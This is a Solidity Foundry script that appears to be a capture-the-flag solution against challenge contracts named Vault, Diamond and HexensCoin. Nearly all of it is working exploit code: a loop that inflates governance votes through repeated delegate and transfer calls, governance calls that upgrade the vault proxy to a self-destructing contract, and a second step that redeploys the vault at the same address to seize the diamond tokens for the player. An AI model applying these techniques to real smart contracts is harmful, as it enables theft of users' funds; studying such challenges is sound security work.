// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/Challenge.sol";
import "src/Vault.sol";
import "src/Diamond.sol";
import "src/HexensCoin.sol";
import "forge-std/Script.sol";
import {ERC20} from "src/openzeppelin-contracts/token/ERC20/ERC20.sol";

contract Exploit {
    // Challenge contracts
    Challenge public setup;
    Vault public vault;
    HexensCoin public hexensCoin;

    constructor(Challenge _setup) {
        // Initialize challenge contracts
        setup = _setup;
        vault = setup.vault();
        hexensCoin = setup.hexensCoin();

        // Claim initial hexensCoin tokens
        setup.claim();
    }

    function exploit() public {
        // Create a contract to hoard votes
        VoteCollector voteCollector = new VoteCollector(setup);

        // Loop while VoteCollector has not enough votes
        while (
            hexensCoin.getCurrentVotes(address(voteCollector)) <
            vault.AUTHORITY_THRESHOLD()
        ) {
            // Add our votes to VoteCollector
            hexensCoin.delegate(address(voteCollector));

            // Set our delegatee to address(0)
            hexensCoin.transfer(address(voteCollector), setup.HEXENS_COINS());
            hexensCoin.delegate(address(0));

            // Regain our hexensCoin tokens
            hexensCoin.transferFrom(
                address(voteCollector),
                address(this),
                setup.HEXENS_COINS()
            );
        }

        // When VoteCollector has enough votes, steal the vault's diamonds
        voteCollector.stealDiamonds();
    }
}

contract VoteCollector {
    // Challenge contracts
    Challenge public setup;
    Vault public vault;
    Diamond public diamond;
    HexensCoin public hexensCoin;

    constructor(Challenge _setup) {
        // Initialize challenge contracts
        setup = _setup;
        vault = setup.vault();
        diamond = setup.diamond();
        hexensCoin = setup.hexensCoin();

        // Allow the Exploit contract to transfer all of this contract's hexensCoin tokens
        hexensCoin.approve(msg.sender, type(uint256).max);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        Burner(to).destruct();
        Burner(to).destruct();
        Burner(to).destruct();
        return true;
    }

    function stealDiamonds() public {
        vault.governanceCall(
            abi.encodeCall(vault.burn, (address(diamond), 31337))
        );
        Destructor destructor = new Destructor();
        vault.governanceCall(
            abi.encodeCall(vault.upgradeTo, (address(destructor)))
        );
        Destructor(address(vault)).destruct();
    }
}

contract Destructor {
    function destruct() public {
        selfdestruct(payable(msg.sender));
    }

    function proxiableUUID() external view returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}

contract NeploxDiamond is ERC20 {
    constructor() ERC20("NeploxDiamond", "Neplox") {}
}

contract FakeBurner {
    constructor(address player, Diamond diamond) {
        diamond.transfer(player, diamond.balanceOf(address(this)));
    }
}

contract TakeOverVault {
    function solve(address player, Diamond diamond) external {
        new FakeBurner(player, diamond);
    }

    function proxiableUUID() external view returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}

contract Solve is Script {
    function step1() external {
        uint256 key = vm.envUint("KEY");
        address player = vm.rememberKey(key);
        console.log("Player address:", player);
        Challenge challenge = Challenge(vm.envAddress("CHALL"));
        console.log("Challenge address:", address(challenge));
        vm.startBroadcast(player);
        Exploit exploit = new Exploit(challenge);
        exploit.exploit();
        vm.stopBroadcast();

        // require(challenge.isSolved(), "Challenge not solved");
    }

    function step2() external {
        uint256 key = vm.envUint("KEY");
        address player = vm.rememberKey(key);
        console.log("Player address:", player);
        Challenge challenge = Challenge(vm.envAddress("CHALL"));
        console.log("Challenge address:", address(challenge));
        vm.startBroadcast(player);
        VaultFactory vaultFactory = challenge.vaultFactory();
        Vault vault = vaultFactory.createVault(
            keccak256(
                "The tea in Nepal is very hot. But the coffee in Peru is much hotter."
            )
        );
        vault.initialize(address(new NeploxDiamond()), address(0x0));
        TakeOverVault takeOverVault = new TakeOverVault();
        vault.upgradeTo(address(takeOverVault));
        console.log("Address of vault:", address(vault));
        TakeOverVault(address(vault)).solve(player, challenge.diamond());
        vm.stopBroadcast();

        require(challenge.isSolved(), "Challenge not solved");
    }
}
